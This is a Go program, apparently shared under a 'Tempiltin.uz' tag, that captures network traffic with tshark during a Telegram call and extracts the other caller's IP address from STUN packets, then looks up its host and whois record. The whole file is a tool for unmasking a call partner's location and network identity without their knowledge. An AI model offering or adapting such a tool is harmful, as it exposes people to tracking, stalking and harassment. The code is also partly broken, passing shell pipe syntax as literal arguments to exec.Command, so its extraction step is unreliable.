package main
//Tempiltin.uz
import (
    "fmt"
    "log"
    "os"
    "os/exec"
    "strings"
)
// Tempiltin.config={"url:True"}
func main() {
    const CAP_PATH = "/tmp/tg_cap.pcap" // Temporary path for pcap capture file
    const CAP_TEXT = "/tmp/tg_text.txt" // Temporary path for text file with information
    const CAP_DURATION = "5"            // Capture duration in seconds

    // Get the external IP address of the device
    ipCmd := exec.Command("curl", "-s", "icanhazip.com")
    ipOutput, err := ipCmd.Output()
    if err != nil {
        log.Fatal("Failed to get IP address:", err)
    }
    MY_IP := strings.TrimSpace(string(ipOutput))

    // Check if Wireshark is installed
    _, err = exec.LookPath("tshark")
    if err != nil {
        log.Println("[-] Wireshark not found. Try installing Wireshark first.")
        log.Println("[+] Debian-based: sudo apt-get install -y tshark")
        log.Println("[+] RedHat-based: sudo yum install -y tshark")
        os.Exit(1)
    }
//Tempiltin.uz
    fmt.Println("[+] Discovering User's IP Address on Telegram using Golang")
    fmt.Println("[+] Starting traffic capture. Please wait for", CAP_DURATION, "seconds...")
//Tempiltin.uz
    // Start traffic capture with Wireshark
    captureCmd := exec.Command("tshark", "-w", CAP_PATH, "-a", "duration:"+CAP_DURATION)
    captureOutput, err := captureCmd.CombinedOutput()
    if err != nil {
        log.Fatal("Traffic capture error:", err)
    }

    fmt.Println("[+] Traffic captured.")

    // Convert pcap file to readable text file
    convertCmd := exec.Command("tshark", "-r", CAP_PATH)
    convertOutput, err := convertCmd.Output()
    if err != nil {
        log.Fatal("Error converting pcap file to text:", err)
    }

    err = os.WriteFile(CAP_TEXT, convertOutput, 0644)
    if err != nil {
        log.Fatal("Error writing text file:", err)
    }

    fmt.Println("[+] Pcap file successfully converted to text.")

    // Check if Telegram traffic is present in the text file
    if strings.Contains(string(convertOutput), "STUN 106") {
        fmt.Println("[+] Telegram traffic found.")
//Tempiltin.uz
        // Extract the IP address from the text
        extractCmd := exec.Command("cat", CAP_TEXT, "|", "grep", "STUN 106", "|", "sed", "'s/^.*XOR-MAPPED-ADDRESS: //'", "|", "awk", "'{match($0,/[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+/); ip = substr($0,RSTART,RLENGTH); print ip}' | awk '!seen[$0]++'")
        extractOutput, err := extractCmd.Output()
        if err != nil {
            log.Fatal("Error extracting IP address:", err)
        }

        TG_OUT := strings.TrimSpace(string(extractOutput))
        IP_1 := strings.Fields(TG_OUT)[0]
        IP_2 := strings.Fields(TG_OUT)[1]

        var IP string
//Tempiltin.uz
        // Check if the IP address is ours or the recipient's
        if MY_IP == IP_1 {
            IP = IP_2
        } else if MY_IP == IP_2 {
            IP = IP_1
        } else {
            IP = "[-] Sorry. IP address not found."
            os.Exit(1)
        }
//Tempiltin.uz
        // Get host information for the IP address
        hostCmd := exec.Command("host", IP)
        hostOutput, err := hostCmd.Output()
        if err != nil {
            log.Fatal("Error getting host information:", err)
        }
//Tempiltin.uz
        fmt.Println("[+]")
        fmt.Println("[+] IP Address:", IP)
        fmt.Println("[+] Host:", strings.TrimSpace(string(hostOutput)))
        fmt.Println("[+]")

        // Clean up temporary files
        err = os.Remove(CAP_PATH)
        if err != nil {
            log.Fatal("Cleanup error:", err)
        }
//Tempiltin.uz
        err = os.Remove(CAP_TEXT)
        if err != nil {
            log.Fatal("Cleanup error:", err)
        }
//Tempiltin.uz
        fmt.Println("[+] Cleanup completed.")
    } else {
        fmt.Println("[-] Telegram traffic not found.")
        fmt.Println("[!]")
        fmt.Println("[!] Run this script only >>>AFTER<<< the response.")
        fmt.Println("[!]")
        os.Exit(1)
    }

    fmt.Println("[?]")
    fmt.Print("[?] Run whois", IP, "? (Y/N): ")

    // Check if the user wants to run the whois command
    var answer string
    fmt.Scanln(&answer)

    if strings.ToUpper(answer) == "Y" {
        whoisCmd := exec.Command("whois", IP)
        whoisOutput, err := whoisCmd.Output()
        if err != nil {
            log.Fatal("Error running whois command:", err)
        }

        fmt.Println(string(whoisOutput))
    } else {
        fmt.Println("[+] Goodbye!")
        os.Exit(0)
    }
}
